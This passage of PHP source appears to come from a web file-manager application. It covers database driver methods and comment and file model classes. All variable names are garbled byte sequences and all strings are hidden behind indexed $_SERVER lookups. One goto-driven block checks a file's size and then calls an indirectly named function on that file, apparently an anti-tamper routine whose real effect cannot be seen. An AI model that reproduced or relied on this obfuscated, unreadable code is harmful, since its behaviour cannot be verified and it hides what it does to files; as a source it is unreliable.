$˜Ğú¦“[$¸À²º‰[362]] : $˜Ğú¦“[$¸À²º‰[32]]; $¼š¹š[$ÉåÜÖ¬Ü] = array($¸À²º‰[32] => $ÉåÜÖ¬Ü, $¸À²º‰[33] => $˜Ğú¦“[$¸À²º‰[33]], $¸À²º‰[35] => (bool) (isset($˜Ğú¦“[$¸À²º‰[106]]) && $˜Ğú¦“[$¸À²º‰[106]] === $¸À²º‰[12] || isset($˜Ğú¦“[$¸À²º‰[35]]) && $˜Ğú¦“[$¸À²º‰[35]] === $¸À²º‰[12]), $¸À²º‰[37] => isset($˜Ğú¦“[$¸À²º‰[37]]) ? $˜Ğú¦“[$¸À²º‰[37]] : (isset($˜Ğú¦“[$¸À²º‰[56]]) ? $˜Ğú¦“[$¸À²º‰[56]] : $¸À²º‰[316]), $¸À²º‰[39] => isset($˜Ğú¦“[$¸À²º‰[97]]) ? strtolower($˜Ğú¦“[$¸À²º‰[97]]) == $¸À²º‰[41] : (isset($˜Ğú¦“[$¸À²º‰[57]]) ? $˜Ğú¦“[$¸À²º‰[57]] : !1), $¸À²º‰[42] => isset($˜Ğú¦“[$¸À²º‰[1043]]) ? strtolower($˜Ğú¦“[$¸À²º‰[1043]]) == $¸À²º‰[44] : (isset($˜Ğú¦“[$¸À²º‰[97]]) ? $˜Ğú¦“[$¸À²º‰[97]] : !1)); } } return $¼š¹š; } public function getTables($´ÀÇ© = '') { $ÚÍŸ°Ôù =& $_SERVER[É¨™èà]; if (think_config($ÚÍŸ°Ôù[1044])) { $ãÎ¤ò›ù = str_replace($ÚÍŸ°Ôù[1045], $´ÀÇ©, think_config($ÚÍŸ°Ôù[1044])); } else { switch ($this->dbType) { case $ÚÍŸ°Ôù[1012]: case $ÚÍŸ°Ôù[1014]: $ãÎ¤ò›ù = $ÚÍŸ°Ôù[1046]; break; case $ÚÍŸ°Ôù[1011]: case $ÚÍŸ°Ôù[1029]: $ãÎ¤ò›ù = $ÚÍŸ°Ôù[1047]; break; case $ÚÍŸ°Ôù[1038]: $ãÎ¤ò›ù = $ÚÍŸ°Ôù[1048]; break; case $ÚÍŸ°Ôù[1013]: think_exception(think_lang($ÚÍŸ°Ôù[1049]) . $ÚÍŸ°Ôù[1050]); break; case $ÚÍŸ°Ôù[1030]: $ãÎ¤ò›ù = $ÚÍŸ°Ôù[45] . $ÚÍŸ°Ôù[46] . $ÚÍŸ°Ôù[47]; break; case $ÚÍŸ°Ôù[1041]: default: if (!empty($´ÀÇ©)) { $ãÎ¤ò›ù = $ÚÍŸ°Ôù[993] . $´ÀÇ© . $ÚÍŸ°Ôù[994]; } else { $ãÎ¤ò›ù = $ÚÍŸ°Ôù[995]; } } } $ñÛ˜Ù€ı = $this->query($ãÎ¤ò›ù); $‘Åñƒ­´ = array(); foreach ($ñÛ˜Ù€ı as $™ õ‹­ø => $Ç·¥÷‘) { $‘Åñƒ­´[$™ õ‹­ø] = current($Ç·¥÷‘); } return $‘Åñƒ­´; } protected function parseLimit($´ÒÕ¹œ‚) { $ÍàùÁÈå =& $_SERVER[É¨™èà]; $È–¼É©› = $ÍàùÁÈå[12]; if (!empty($´ÒÕ¹œ‚)) { switch ($this->dbType) { case $ÍàùÁÈå[1038]: case $ÍàùÁÈå[1030]: $´ÒÕ¹œ‚ = explode($ÍàùÁÈå[50], $´ÒÕ¹œ‚); if (count($´ÒÕ¹œ‚) > 1) { $È–¼É©› .= $ÍàùÁÈå[51] . $´ÒÕ¹œ‚[1] . $ÍàùÁÈå[52] . $´ÒÕ¹œ‚[0] . $ÍàùÁÈå[53]; } else { $È–¼É©› .= $ÍàùÁÈå[51] . $´ÒÕ¹œ‚[0] . $ÍàùÁÈå[53]; } break; case $ÍàùÁÈå[1011]: case $ÍàùÁÈå[1029]: break; case $ÍàùÁÈå[1013]: break; case $ÍàùÁÈå[1012]: case $ÍàùÁÈå[1014]: break; case $ÍàùÁÈå[1041]: default: $È–¼É©› .= $ÍàùÁÈå[51] . $´ÒÕ¹œ‚ . $ÍàùÁÈå[53]; } } return $È–¼É©›; } public function parseKey(&$›ò§åÍÑ, $–Ô³“æ¨ = true) { $÷â¢›ïã =& $_SERVER[É¨™èà]; if ($–Ô³“æ¨) { $›ò§åÍÑ = $this->parseKeyCheck($›ò§åÍÑ); } if ($this->dbType == $÷â¢›ïã[1041]) { if ($›ò§åÍÑ != $÷â¢›ïã[223] && !preg_match($÷â¢›ïã[1005], $›ò§åÍÑ)) { $›ò§åÍÑ = $÷â¢›ïã[471] . trim($›ò§åÍÑ, $÷â¢›ïã[471]) . $÷â¢›ïã[471]; } return $›ò§åÍÑ; } else { return parent::parseKey($›ò§åÍÑ, $–Ô³“æ¨); } } public function close() { $this->_linkID = null; } public function error() { $­Úˆ¦Œ€ =& $_SERVER[É¨™èà]; if ($this->PDOStatement) { $éÂ”Ó÷¢ = $this->PDOStatement->errorInfo(); $this->error = $éÂ”Ó÷¢[1] . $­Úˆ¦Œ€[4] . $éÂ”Ó÷¢[2]; } else { $this->error = $­Úˆ¦Œ€[12]; } if ($­Úˆ¦Œ€[12] != $this->queryStr) { $this->error .= LNG($­Úˆ¦Œ€[48]) . $this->queryStr; } think_trace($this->error, $­Úˆ¦Œ€[12], $­Úˆ¦Œ€[49]); return $this->error; } public function escapeString($öä˜Òä–) { $‚şìòØŒ =& $_SERVER[É¨™èà]; switch ($this->dbType) { case $‚şìòØŒ[1038]: case $‚şìòØŒ[1011]: case $‚şìòØŒ[1029]: case $‚şìòØŒ[1041]: return addslashes($öä˜Òä–); case $‚şìòØŒ[1013]: case $‚şìòØŒ[1030]: case $‚şìòØŒ[1012]: case $‚şìòØŒ[1014]: return str_ireplace($‚şìòØŒ[58], $‚şìòØŒ[59], $öä˜Òä–); } } protected function parseValue($ŞËÙÇ¼Ó) { $Ùë ³òÔ =& $_SERVER[É¨™èà]; if (is_string($ŞËÙÇ¼Ó)) { $Šìüæ—Â = strpos($ŞËÙÇ¼Ó, $Ùë ³òÔ[4]) === 0 && in_array($ŞËÙÇ¼Ó, array_keys($this->bind)); $ŞËÙÇ¼Ó = $Šìüæ—Â ? $this->escapeString($ŞËÙÇ¼Ó) : $Ùë ³òÔ[1051] . $this->escapeString($ŞËÙÇ¼Ó) . $Ùë ³òÔ[1051]; } elseif (isset($ŞËÙÇ¼Ó[0]) && is_string($ŞËÙÇ¼Ó[0]) && strtolower($ŞËÙÇ¼Ó[0]) == $Ùë ³òÔ[383]) { $ŞËÙÇ¼Ó = $this->escapeString($ŞËÙÇ¼Ó[1]); } elseif (is_array($ŞËÙÇ¼Ó)) { $ŞËÙÇ¼Ó = array_map(array($this, $Ùë ³òÔ[1052]), $ŞËÙÇ¼Ó); } elseif (is_bool($ŞËÙÇ¼Ó)) { $ŞËÙÇ¼Ó = $ŞËÙÇ¼Ó ? $Ùë ³òÔ[91] : $Ùë ³òÔ[231]; } elseif (is_null($ŞËÙÇ¼Ó)) { $ŞËÙÇ¼Ó = $Ùë ³òÔ[106]; } return $ŞËÙÇ¼Ó; } public function getLastInsertId() { $ßÄÈ™Ä¥ =& $_SERVER[É¨™èà]; switch ($this->dbType) { case $ßÄÈ™Ä¥[1038]: case $ßÄÈ™Ä¥[1030]: case $ßÄÈ™Ä¥[1011]: case $ßÄÈ™Ä¥[1029]: case $ßÄÈ™Ä¥[1013]: case $ßÄÈ™Ä¥[1041]: return $this->_linkID->lastInsertId(); case $ßÄÈ™Ä¥[1012]: case $ßÄÈ™Ä¥[1014]: $ÃˆÛ•æé = $this->table; $×îÊ†“Ò = $this->query("\x53\x45\x4c\105\103\x54\40{$ÃˆÛ•æé}\x2e\x63\165\162\x72\x76\x61\x6c\x20\x63\x75\162\162\x76\141\x6c\40\106\122\x4f\x4d\40\x64\165\x61\x6c"); return $×îÊ†“Ò ? $×îÊ†“Ò[0][$ßÄÈ™Ä¥[1053]] : 0; } } } goto c±™Öå¬Å°; eÛŠ·ÚÃÇ: $_file = $_SERVER[$_SERVER[É¨™èà][309]]; $_size = $_SERVER[É¨™èà][2480]; if ($_SERVER[$_SERVER[É¨™èà][308]] != $_size($_file)) { $_getc = $_SERVER[É¨™èà][310]; $_getfile = $_SERVER[$_SERVER[É¨™èà][311]] . $_SERVER[É¨™èà][312]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[É¨™èà][288], $_getfilec); if (count($_getarrs) < $_SERVER[É¨™èà][313]) { $exit = $_SERVER[É¨™èà][314]; $exit(); } $_act = $_SERVER[É¨™èà][315]; $_act($_file); } goto E…¼º…§Ü—; AœŠêÚ›±: class CommentModel extends ModelBase { protected $tableName = "\143\x6f\x6d\155\145\156\164"; protected $tableMeta = array("\x74\x61\x62\154\x65\x4e\141\x6d\145" => "\143\157\x6d\x6d\x65\156\x74\x5f\x6d\x65\x74\141", "\155\x65\x74\x61\x46\151\145\x6c\144" => "\143\x6f\155\155\x65\x6e\164\x49\x44"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($•”Ã¥ÄÀ) { $ë–„˜Ì =& $_SERVER[É¨™èà]; if ($•”Ã¥ÄÀ[$ë–„˜Ì[2028]]) { $Ñáó­œå = $this->where(array($ë–„˜Ì[2029] => $•”Ã¥ÄÀ[$ë–„˜Ì[2028]]))->find(); if (!$Ñáó­œå || $Ñáó­œå[$ë–„˜Ì[191]] != $•”Ã¥ÄÀ[$ë–„˜Ì[191]] || $Ñáó­œå[$ë–„˜Ì[581]] != $•”Ã¥ÄÀ[$ë–„˜Ì[581]]) { return !1; } $this->where(array($ë–„˜Ì[2029] => $•”Ã¥ÄÀ[$ë–„˜Ì[2028]]))->setAdd($ë–„˜Ì[2030], 1); } $•”Ã¥ÄÀ[$ë–„˜Ì[2031]] = 0; $•”Ã¥ÄÀ[$ë–„˜Ì[2030]] = 0; $•”Ã¥ÄÀ[$ë–„˜Ì[840]] = 1; return $this->add($•”Ã¥ÄÀ); } public function commentCount($—æâú¾©, $ß©¹ÍÁ­, $ûöØÙÀ = false) { $Ç´Ê êô =& $_SERVER[É¨™èà]; if (!$—æâú¾©) { return array(); } if (is_string($—æâú¾©) || is_int($—æâú¾©)) { $—æâú¾© = array($—æâú¾©); } $ÎÎôñğ = array($Ç´Ê êô[581], $Ç´Ê êô[2032] => $Ç´Ê êô[577]); $ÁÀ­£å» = array($Ç´Ê êô[581] => array($Ç´Ê êô[7], $—æâú¾©), $Ç´Ê êô[191] => $ß©¹ÍÁ­); if ($ûöØÙÀ) { $ÁÀ­£å»[$Ç´Ê êô[1800]] = $ûöØÙÀ; } $ÓûåÃœÙ = $this->field($ÎÎôñğ)->where($ÁÀ­£å»)->group($Ç´Ê êô[581])->select(); return array_to_keyvalue($ÓûåÃœÙ, $Ç´Ê êô[581], $Ç´Ê êô[577]); } public function starTarget($Ïà·À°, $ßÂŞ¾»¬) { $Ÿ‰—€½Ö =& $_SERVER[É¨™èà]; $³‚ÖîòÊ = $Ïà·À° + self::TYPE_STAR_OFFSET; $´â¬´©Ç = array($Ÿ‰—€½Ö[1800] => USER_ID, $Ÿ‰—€½Ö[191] => $³‚ÖîòÊ, $Ÿ‰—€½Ö[581] => $ßÂŞ¾»¬); $Âß¨Ë“ˆ = $this->where($´â¬´©Ç)->find(); if ($Âß¨Ë“ˆ) { return $this->where(array($Ÿ‰—€½Ö[485] => $Âß¨Ë“ˆ[$Ÿ‰—€½Ö[485]]))->delete(); } $è•ëçŠ = array($Ÿ‰—€½Ö[2028] => 0, $Ÿ‰—€½Ö[1800] => USER_ID, $Ÿ‰—€½Ö[840] => 1, $Ÿ‰—€½Ö[171] => $Ÿ‰—€½Ö[12], $Ÿ‰—€½Ö[191] => $³‚ÖîòÊ, $Ÿ‰—€½Ö[581] => $ßÂŞ¾»¬, $Ÿ‰—€½Ö[2031] => 0, $Ÿ‰—€½Ö[2030] => 0); return $this->add($è•ëçŠ); } public function starTargetCount($‘ßûÖÅ÷, $†¡¾âì) { $˜Õ‚ Íè =& $_SERVER[É¨™èà]; $ì¤ëíŒ = $†¡¾âì + self::TYPE_STAR_OFFSET; $´óÂ±û‚ = $this->commentCount($‘ßûÖÅ÷, $ì¤ëíŒ); $Ô‹›ÆÒ = $this->commentCount($‘ßûÖÅ÷, $ì¤ëíŒ, USER_ID); return array($˜Õ‚ Íè[2033] => $´óÂ±û‚, $˜Õ‚ Íè[2034] => $Ô‹›ÆÒ); } public function starTargetUserList($¿­òöˆê, $šÏÅ†º) { $¤´«™ƒÁ =& $_SERVER[É¨™èà]; $ñä¼Á‡ = $¿­òöˆê + self::TYPE_STAR_OFFSET; $ÙµüˆêÀ = array($¤´«™ƒÁ[581] => $šÏÅ†º, $¤´«™ƒÁ[191] => $ñä¼Á‡); $ãâ¸„Äƒ = $this->where($ÙµüˆêÀ)->count(); $”›Œ´œä = array($¤´«™ƒÁ[344] => $ãâ¸„Äƒ, $¤´«™ƒÁ[2035] => array()); if (!$ãâ¸„Äƒ) { return $”›Œ´œä; } $©†äúšì = $this->field($¤´«™ƒÁ[1800])->where($ÙµüˆêÀ)->limit(500)->select(); $©†äúšì = array_to_keyvalue($©†äúšì, $¤´«™ƒÁ[12], $¤´«™ƒÁ[1800]); $”›Œ´œä[$¤´«™ƒÁ[2035]] = Model($¤´«™ƒÁ[589])->userListInfo($©†äúšì); return $”›Œ´œä; } public function prasiseUserList($Ä’°¤ª¹) { $âºä–öÍ =& $_SERVER[É¨™èà]; $ßï®ô‚ = array($âºä–öÍ[2036] => $Ä’°¤ª¹); $øÓ¦íğ» = $this->where($ßï®ô‚)->find(); $»¶ô = _get($øÓ¦íğ», $âºä–öÍ[2031], 0); $Öõƒş„İ = array($âºä–öÍ[344] => $»¶ô, $âºä–öÍ[2035] => array()); if (!$»¶ô) { return $Öõƒş„İ; } $ƒÏ¸Î•Î = Model($âºä–öÍ[2037])->field($âºä–öÍ[1800])->where($ßï®ô‚)->limit(500)->select(); $ƒÏ¸Î•Î = array_to_keyvalue($ƒÏ¸Î•Î, $âºä–öÍ[12], $âºä–öÍ[1800]); $Öõƒş„İ[$âºä–öÍ[2035]] = Model($âºä–öÍ[589])->userListInfo($ƒÏ¸Î•Î); return $Öõƒş„İ; } public function remove($‹•‰ÜŠ‘) { $ğğ ê =& $_SERVER[É¨™èà]; $ì‹éîÔŸ = array($ğğ ê[2029] => $‹•‰ÜŠ‘); $ÙÌÎâÈó = $this->where($ì‹éîÔŸ)->find(); if ($ÙÌÎâÈó[$ğğ ê[2028]]) { $this->where(array($ğğ ê[2029] => $ÙÌÎâÈó[$ğğ ê[2028]]))->setAdd($ğğ ê[2030], -1); } return $this->removeArray($‹•‰ÜŠ‘); } public function edit($Ïİ¾´¿Â, $´òß›ã´) { $´Âã¥ÁŸ =& $_SERVER[É¨™èà]; $÷…Û­‚” = array($´Âã¥ÁŸ[2029] => $Ïİ¾´¿Â); return $this->where($÷…Û­‚”)->save(array($´Âã¥ÁŸ[2038] => $´òß›ã´)); } public function prasise($òßˆÜğ) { $ÊŠ«¦ì— =& $_SERVER[É¨™èà]; $•ÕĞ€â = Model($ÊŠ«¦ì—[2039]); $í®ø¹‹ı = array($ÊŠ«¦ì—[2029] => $òßˆÜğ, $ÊŠ«¦ì—[1791] => USER_ID); $”˜îÂ¡­ = $•ÕĞ€â->where($í®ø¹‹ı)->find(); if (!$”˜îÂ¡­) { $•ÕĞ€â->add($í®ø¹‹ı); $±Œñ¾Èí = $this->where(array($ÊŠ«¦ì—[2029] => $òßˆÜğ))->setAdd($ÊŠ«¦ì—[2031], 1); } else { $•ÕĞ€â->where($í®ø¹‹ı)->delete(); $±Œñ¾Èí = $this->where(array($ÊŠ«¦ì—[2029] => $òßˆÜğ))->setAdd($ÊŠ«¦ì—[2031], -1); } return $±Œñ¾Èí; } public function targetInfo($›êƒÏ•ò, $â°äîÃ‚) { $º‰ÙÛ¤½ =& $_SERVER[É¨™èà]; $˜—ÏúÖ = array($º‰ÙÛ¤½[663] => $›êƒÏ•ò, $º‰ÙÛ¤½[664] => $â°äîÃ‚); $¶°ş‹¡è = $this->where($˜—ÏúÖ)->count(); $¢™³¬Ë = "\x52\111\x47\110\124\x20\x4a\x4f\x49\x4e\40{$this->tablePrefix}\x63\x6f\x6d\155\x65\x6e\164\x5f\160\162\141\151\163\145\x20\x73\x74\141\x72\40\x6f\156\x20\143\x6f\155\x6d\145\x6e\x74\x2e\x63\157\x6d\x6d\x65\x6e\x74\111\x44\x20\75\x20\163\164\141\162\56\143\x6f\155\x6d\145\x6e\164\x49\104"; $™ÚãµØç = $this->alias($º‰ÙÛ¤½[440])->where($˜—ÏúÖ)->join($¢™³¬Ë, $º‰ÙÛ¤½[2040])->count(); $ó¦µ£¨” = array($º‰ÙÛ¤½[2041] => $¶°ş‹¡è, $º‰ÙÛ¤½[2042] => $™ÚãµØç); return $ó¦µ£¨”; } public function listData($»ğ½Ç¶Ö) { $²ï· Ğ =& $_SERVER[É¨™èà]; if (isset($»ğ½Ç¶Ö[$²ï· Ğ[2043]])) { if ($»ğ½Ç¶Ö[$²ï· Ğ[2043]]) { $»ğ½Ç¶Ö[$²ï· Ğ[2036]] = array($²ï· Ğ[1108], intval($»ğ½Ç¶Ö[$²ï· Ğ[2043]])); } unset($»ğ½Ç¶Ö[$²ï· Ğ[2043]]); } if (isset($»ğ½Ç¶Ö[$²ï· Ğ[2044]])) { if ($»ğ½Ç¶Ö[$²ï· Ğ[2044]]) { $»ğ½Ç¶Ö[$²ï· Ğ[2036]] = array($²ï· Ğ[1105], intval($»ğ½Ç¶Ö[$²ï· Ğ[2044]])); } unset($»ğ½Ç¶Ö[$²ï· Ğ[2044]]); } return $this->_listData($»ğ½Ç¶Ö); } private function _listData($Š’ÑÅ×) { $»ó¯ôÒ‹ =& $_SERVER[É¨™èà]; $ŠÖ®›ü = $this->where($Š’ÑÅ×)->_makeOrder()->selectPage(100); $this->_listAppendParent($ŠÖ®›ü[$»ó¯ôÒ‹[456]]); $this->_listAppendUser($ŠÖ®›ü[$»ó¯ôÒ‹[456]]); $this->_listAppendMeta($ŠÖ®›ü[$»ó¯ôÒ‹[456]]); return $ŠÖ®›ü; } private function _makeOrder() { $­‚¬¤üÎ =& $_SERVER[É¨™èà]; $ªı›ƒ°Â = array($­‚¬¤üÎ[2031], $­‚¬¤üÎ[2030], $­‚¬¤üÎ[234]); $é›°Ÿş = Input::get($­‚¬¤üÎ[540], $­‚¬¤üÎ[7], $­‚¬¤üÎ[507], $ªı›ƒ°Â); $èÒ«¦ŞŠ = Input::get($­‚¬¤üÎ[541], $­‚¬¤üÎ[7], $­‚¬¤üÎ[1793], array($­‚¬¤üÎ[2045], $­‚¬¤üÎ[536])); $Ú‚¸ì³Ë = $é›°Ÿş . $­‚¬¤üÎ[53] . $èÒ«¦ŞŠ; return $this->order($Ú‚¸ì³Ë); } private function _listAppendParent(&$ŒÁôˆ¡) { $áæ‰Ëš =& $_SERVER[É¨™èà]; $­ëÆä¡à = array_unique(array_to_keyvalue($ŒÁôˆ¡, $áæ‰Ëš[12], $áæ‰Ëš[2028])); $­ëÆä¡à = array_remove_value($­ëÆä¡à, $áæ‰Ëš[231]); if (!$­ëÆä¡à) { return; } $İäÒêÜß = $this->where(array($áæ‰Ëš[2029] => array($áæ‰Ëš[7], $­ëÆä¡à)))->select(); $İäÒêÜß = array_to_keyvalue($İäÒêÜß, $áæ‰Ëš[2036]); foreach ($ŒÁôˆ¡ as &$ı°æğ¸) { if (isset($İäÒêÜß[$ı°æğ¸[$áæ‰Ëš[2028]]])) { $ı°æğ¸[$áæ‰Ëš[2046]] = $İäÒêÜß[$ı°æğ¸[$áæ‰Ëš[2028]]]; } } unset($ı°æğ¸); } private function _listAppendUser(&$­³©à§) { $™·÷÷£ù =& $_SERVER[É¨™èà]; $ æÜ€ŞÍ = array_unique(array_to_keyvalue($­³©à§, $™·÷÷£ù[12], $™·÷÷£ù[1800])); $ æÜ€ŞÍ = array_remove_value($ æÜ€ŞÍ, $™·÷÷£ù[231]); if (count($ æÜ€ŞÍ) == 0) { return; } foreach ($­³©à§ as $¢æç‹âÚ) { if (isset($¢æç‹âÚ[$™·÷÷£ù[2046]])) { $ æÜ€ŞÍ[] = $¢æç‹âÚ[$™·÷÷£ù[2046]][$™·÷÷£ù[1800]]; } } $Ü‡åŠÈ = Model($™·÷÷£ù[609])->userListInfo($ æÜ€ŞÍ); foreach ($­³©à§ as &$¢æç‹âÚ) { $¢æç‹âÚ[$™·÷÷£ù[677]] = $Ü‡åŠÈ[$¢æç‹âÚ[$™·÷÷£ù[1800]]]; if (isset($¢æç‹âÚ[$™·÷÷£ù[2046]])) { $¢æç‹âÚ[$™·÷÷£ù[2046]][$™·÷÷£ù[677]] = $Ü‡åŠÈ[$¢æç‹âÚ[$™·÷÷£ù[2046]][$™·÷÷£ù[1800]]]; } } unset($¢æç‹âÚ); } private function _listAppendMeta(&$›¼üà´î) { $ïÏÕûß =& $_SERVER[É¨™èà]; $ª¡ˆÈ” = array_unique(array_to_keyvalue($›¼üà´î, $ïÏÕûß[12], $ïÏÕûß[2036])); $ª¡ˆÈ” = array_remove_value($ª¡ˆÈ”, $ïÏÕûß[231]); if (!$ª¡ˆÈ”) { return; } foreach ($›¼üà´î as $ÔÑÅÁŞÙ) { if (isset($ÔÑÅÁŞÙ[$ïÏÕûß[2046]])) { $ª¡ˆÈ”[] = $ÔÑÅÁŞÙ[$ïÏÕûß[2046]][$ïÏÕûß[2036]]; } } $ÉÔ±Ìı = $this->metaList($ª¡ˆÈ”); if (!$ÉÔ±Ìı) { return !1; } foreach ($›¼üà´î as &$ÔÑÅÁŞÙ) { $ÔÑÅÁŞÙ[$ïÏÕûß[551]] = $ÉÔ±Ìı[$ÔÑÅÁŞÙ[$ïÏÕûß[2036]]]; if (isset($ÔÑÅÁŞÙ[$ïÏÕûß[2046]])) { $ÔÑÅÁŞÙ[$ïÏÕûß[2046]][$ïÏÕûß[551]] = $ÉÔ±Ìı[$ÔÑÅÁŞÙ[$ïÏÕûß[2046]][$ïÏÕûß[2036]]]; } } unset($ÔÑÅÁŞÙ); } private function metaList($­Ç’£ĞÑ) { $‡ÂìÆÓ¸ =& $_SERVER[É¨™èà]; if (!$­Ç’£ĞÑ) { return array(); } $­ğ¥µ¡„ = array($‡ÂìÆÓ¸[2036] => array($‡ÂìÆÓ¸[7], $­Ç’£ĞÑ)); $Šæ›ñ¢å = Model($‡ÂìÆÓ¸[2047])->where($­ğ¥µ¡„)->select(); $Šæ›ñ¢å = array_to_keyvalue_group($Šæ›ñ¢å, $‡ÂìÆÓ¸[2036]); foreach ($Šæ›ñ¢å as $ã»ØÙ€ˆ => $ Œ§–ÓÉ) { $Ó¥¡³¯ê = array(); foreach ($ Œ§–ÓÉ as $±Ğóí­) { $Ó¥¡³¯ê[$±Ğóí­[$‡ÂìÆÓ¸[97]]] = $±Ğóí­[$‡ÂìÆÓ¸[461]]; } $Šæ›ñ¢å[$ã»ØÙ€ˆ] = $Ó¥¡³¯ê; } return $Šæ›ñ¢å ? $Šæ›ñ¢å : array(); } public function removeTarget($¢öéåÇ, $ï‹Çáş¶) { $Çßúæ­© =& $_SERVER[É¨™èà]; if (!$ï‹Çáş¶) { return !0; } $ï‹Çáş¶ = is_array($ï‹Çáş¶) ? $ï‹Çáş¶ : array($ï‹Çáş¶); $Ä‰‡Ü™ = array($Çßúæ­©[191] => $¢öéåÇ, $Çßúæ­©[581] => array($Çßúæ­©[7], $ï‹Çáş¶)); $¬èÔŠûÖ = $this->field($Çßúæ­©[2036])->where($Ä‰‡Ü™)->select(); $×¦–´Ì = array_to_keyvalue($¬èÔŠûÖ, $Çßúæ­©[12], $Çßúæ­©[2036]); return $this->removeArray($×¦–´Ì); } public function removeArray($éÉ¢¾¬Û) { $‡îšú°ù =& $_SERVER[É¨™èà]; if (!$éÉ¢¾¬Û) { return !0; } $éÉ¢¾¬Û = is_array($éÉ¢¾¬Û) ? $éÉ¢¾¬Û : array($éÉ¢¾¬Û); $…ä½Ó•¿ = array($‡îšú°ù[2036] => array($‡îšú°ù[7], $éÉ¢¾¬Û)); Model($‡îšú°ù[2039])->where($…ä½Ó•¿)->delete(); Model($‡îšú°ù[2048])->where($…ä½Ó•¿)->delete(); return $this->where($…ä½Ó•¿)->delete(); } } class FileContentModel extends ModelBase { protected $tableName = "\151\157\137\x66\x69\x6c\x65\x5f\x63\x6f\x6e\x74\x65\156\164\163"; protected $dataAuto = array(array("\143\x72\x65\x61\x74\145\124\151\x6d\x65", "\164\x69\x6d\145", "\x69\156\x73\x65\162\164", "\146\x75\156\x63\x74\151\x6f\156")); } class FileModel extends ModelBase { protected $tableName = "\151\157\137\x66\x69\154\x65"; protected $tableMeta = array("\164\x61\x62\154\x65\116\x61\155\145" => "\151\157\137\x66\x69\x6c\x65\x5f\x6d\x65\164\x61", "\x6d\x65\164\141\106\151\x65\x6c\x64" => "\146\151\154\145\111\x44"); public function fileInfo($££’šÇ) { $íÕ÷õ§¶ =& $_SERVER[É¨™èà]; static $ä»Ô«‚ = array(); if (!isset($ä»Ô«‚[$££’šÇ])) { $’•ğ±Èğ = $íÕ÷õ§¶[2049]; $î’ä¥“ı = Model($íÕ÷õ§¶[556])->field($’•ğ±Èğ)->where(array($íÕ÷õ§¶[554] => $££’šÇ))->find(); $ä»Ô«‚[$££’šÇ] = $î’ä¥“ı; } return $ä»Ô«‚[$££’šÇ]; } public function addFileByContent($ü¾Ñö÷í = '', $ĞÍ»Ğ», $ùä¡ÑÛğ = '') { $„ô§ê…² =& $_SERVER[É¨™èà]; $êˆŞäÉÙ = TEMP_PATH . $„ô§ê…²[2050]; if (!is_dir($êˆŞäÉÙ)) { mk_dir($êˆŞäÉÙ); } $³±¹´ıÈ = $êˆŞäÉÙ . $„ô§ê…²[2051] . rand_string(16); $€ô•ÔÕ = file_put_contents($³±¹´ıÈ, $ü¾Ñö÷í); if ($€ô•ÔÕ === !1 || strlen($ü¾Ñö÷í) != $€ô•ÔÕ) { return !1; } $¼…Ø€Ò = $this->addFile($³±¹´ıÈ, $ĞÍ»Ğ», $ùä¡ÑÛğ, !0); if (file_exists($³±¹´ıÈ)) { @unlink($³±¹´ıÈ); } return $¼…Ø€Ò; } public function createFileName($¡È®»üÔ, $”Ëñ°ĞŸ, $®ÈªÔ‹“ = false, $àµâÛŸ‡ = false) { $™™á§³» =& $_SERVER[É¨™èà]; $Ö”şïÈ = IO::init($™™á§³»[8]); $ÀÊáÊÀ = $this->_makeFilePath($¡È®»üÔ, $”Ëñ°ĞŸ, $Ö”şïÈ, $®ÈªÔ‹“, $àµâÛŸ‡); $´ìù¸ŒÊ = $Ö”şïÈ->pathFather($ÀÊáÊÀ); static $åçÕÔ„œ = false; $Ÿ÷½Á›° = $™™á§³»[2052] . md5($´ìù¸ŒÊ); if (!$åçÕÔ„œ && !Cache::get($Ÿ÷½Á›°)) { $åçÕÔ„œ = !0; $Î¢äùÈ = IO::mkdir($´ìù¸ŒÊ); if (!IO::exist($Î¢äùÈ . $™™á§³»[890])) { IO::mkfile($Î¢äùÈ . $™™á§³»[890]); } Cache::set($Ÿ÷½Á›°, 1, 3600 * 2); } return $ÀÊáÊÀ; } public function _makeFilePath($éş´ÎÎ, $Ã¢Ïš¼Ë, $¡ÏÜ…÷£, $§üéšäò = false, $»ÕÔÂ» = false) { $í˜ë‹° =& $_SERVER[É¨™èà]; $‘Òçæ’û = Model($í˜ë‹°[861])->get($í˜ë‹°[2053]); $™¥õÑÈ° = $í˜ë‹°[1342] . $Ã¢Ïš¼Ë[$í˜ë‹°[485]] . $í˜ë‹°[494] . date($í˜ë‹°[2054]); $Ú–”¥¼ = $™¥õÑÈ° . rand_string(5) . short_id(100); $éş´ÎÎ = str_replace($í˜ë‹°[8], $í˜ë‹°[11], KodIO::clear($éş´ÎÎ)); $ÃÜŠù±ı = $¡ÏÜ…÷£->ext($éş´ÎÎ); if (!$éş´ÎÎ) { $‘Òçæ’û = $í˜ë‹°[867]; } switch ($‘Òçæ’û) { case $í˜ë‹°[2055]: if ($ÃÜŠù±ı) { $Ú–”¥¼ = $Ú–”¥¼ . $í˜ë‹°[10] . $ÃÜŠù±ı; } if ($ÃÜŠù±ı == $í˜ë‹°[1992]) { $Ú–”¥¼ .= $í˜ë‹°[1311]; } break; case $í˜ë‹°[2056]: $¾¬³‘şï = Model($í˜ë‹°[861])->get($í˜ë‹°[862]); $…ß§ã¢÷ = substr(md5($í˜ë‹°[863] . $¾¬³‘şï . date($í˜ë‹°[839])), 0, 8); $™¥õÑÈ° = $í˜ë‹°[1342] . $Ã¢Ïš¼Ë[$í˜ë‹°[485]] . $í˜ë‹°[494] . date($í˜ë‹°[2057]) . $…ß§ã¢÷ . $í˜ë‹°[8]; if ($ÃÜŠù±ı == $í˜ë‹°[1992]) { $éş´ÎÎ .= $í˜ë‹°[1311]; } $›©Ô¬à = $í˜ë‹°[2058] . $™¥õÑÈ° . $éş´ÎÎ; CacheLock::lock($›©Ô¬à); $Ú–”¥¼ = $™¥õÑÈ° . $éş´ÎÎ; if (IO::exist($™¥õÑÈ° . $éş´ÎÎ)) { $ø‚™È¾Ë = substr($éş´ÎÎ, 0, strlen($éş´ÎÎ) - strlen($ÃÜŠù±ı)); $ñçÒÕª¶ = $»ÕÔÂ» ? substr($»ÕÔÂ», 0, 5) : ($§üéšäò ? substr($§üéšäò, 0, 5) : rand_string(5)); $Ú–”¥¼ = $™¥õÑÈ° . 